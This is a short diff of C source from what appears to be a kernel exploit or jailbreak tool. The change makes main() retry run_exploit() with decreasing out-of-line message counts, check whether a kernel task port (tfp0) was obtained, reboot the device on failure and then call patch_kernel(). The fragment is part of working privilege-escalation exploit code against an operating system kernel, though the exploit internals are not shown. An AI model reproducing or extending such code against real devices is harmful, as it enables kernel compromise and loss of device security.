@@ -65,12 +65,24 @@ int main(void) {
     setuid(0);
     setgid(0);
 
-    if (run_exploit(1024) != 0) {
+    // hack, to just keep trying until it succeeds somehow
+    int ool_count = 1000;
+    int ret = -1;
+    while (ool_count >= 100 && ret != 0) {
+        print_log("[*] ool_count = %d\n", ool_count);
+        ret = run_exploit(ool_count);
+        if (ret == 0) break;
+        ool_count -= 100;
+        usleep(20000);
+    }
+
+    if (!kinfo->tfp0) {
         print_log("[-] exploit failed\n");
-        usleep(100000);
-        exit(0);
+        usleep(1000000);
+        reboot(0);
         return -1;
     }
+    print_log("[*] exploit done\n");
 
     if (patch_kernel() != 0) {
         print_log("[-] failed to patch kernel\n");
